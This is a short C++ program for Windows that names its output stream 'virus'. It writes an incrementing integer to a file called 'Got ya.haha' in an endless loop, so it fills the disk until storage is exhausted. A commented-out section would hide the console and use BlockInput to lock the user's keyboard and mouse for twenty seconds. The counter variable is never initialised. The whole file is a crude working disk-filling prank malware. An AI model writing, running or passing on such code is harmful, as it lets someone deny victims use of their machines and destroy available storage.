#include <iostream>
#include <fstream>
#include <windows.h>

using namespace std;

int main()
{
    //FreeConsole();
    /*
            std::cout << "<<Start";
            FreeConsole();

           BlockInput(true);
            Sleep(20000);

            BlockInput(false);

            std::cout << "<<Done";
    */
    int fillUp;
    ofstream virus;
    virus.open("Got ya.haha");
    while(1)
    {
        virus<<fillUp;
        fillUp++;
    }
    virus.close();
}

